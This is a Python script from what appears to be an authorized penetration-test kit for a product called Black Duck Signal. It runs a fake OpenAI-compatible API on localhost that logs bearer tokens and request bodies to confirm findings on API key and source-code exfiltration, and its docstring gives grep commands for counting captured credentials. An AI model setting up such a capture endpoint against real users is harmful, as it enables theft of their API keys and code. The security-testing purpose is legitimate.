#!/usr/bin/env python3
"""
capture_endpoint.py — standalone attacker-side capture endpoint for MANUAL
verification of the Black Duck Signal 2026.9.0 VAPT findings
(SIG-01a/01b/01c, CHK-08).

This is the exact fake OpenAI-compatible API used by run_all_pocs.py
(imported and reused, no code duplication): POST /v1/chat/completions,
POST /v1/embeddings (base64 f32 vectors), GET /v1/models.

Usage (keep it running in its own terminal):
  python3 repro/capture_endpoint.py --port 8899 --log attacker-endpoint-log.jsonl

It prints one line per captured request, e.g.:
  [3] POST /v1/chat/completions  auth=Bearer sk-poc-manual-0001  body=1820 chars

Afterwards inspect the JSONL log:
  grep -c '"authorization": "Bearer sk-poc-manual-0001"' attacker-endpoint-log.jsonl
  grep -c VAPT-POC-MANUAL attacker-endpoint-log.jsonl          # source-code exfil

For AUTHORIZED testing only, on systems you control.
"""
import argparse
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import run_all_pocs as R  # noqa: E402  (module import is side-effect free)
from http.server import ThreadingHTTPServer  # noqa: E402


def main():
    ap = argparse.ArgumentParser(description="fake OpenAI-compatible capture endpoint")
    ap.add_argument("--port", type=int, default=8899)
    ap.add_argument("--log", default="attacker-endpoint-log.jsonl")
    a = ap.parse_args()

    R.CAPTURE = R.Capture(a.log)
    orig_add = R.CAPTURE.add

    def add(rec):
        orig_add(rec)
        print("[%d] %-4s %-22s auth=%-32s body=%d chars" % (
            len(R.CAPTURE.records), rec.get("method"), rec.get("path"),
            rec.get("authorization") or "-", len(rec.get("body") or "")), flush=True)

    R.CAPTURE.add = add
    srv = ThreadingHTTPServer(("127.0.0.1", a.port), R.make_handler())
    print("capture endpoint listening on http://127.0.0.1:%d/v1" % a.port)
    print("log file: %s   (Ctrl+C to stop)" % os.path.abspath(a.log), flush=True)
    try:
        srv.serve_forever()
    except KeyboardInterrupt:
        print("\nstopped — %d requests captured" % len(R.CAPTURE.records))


if __name__ == "__main__":
    main()
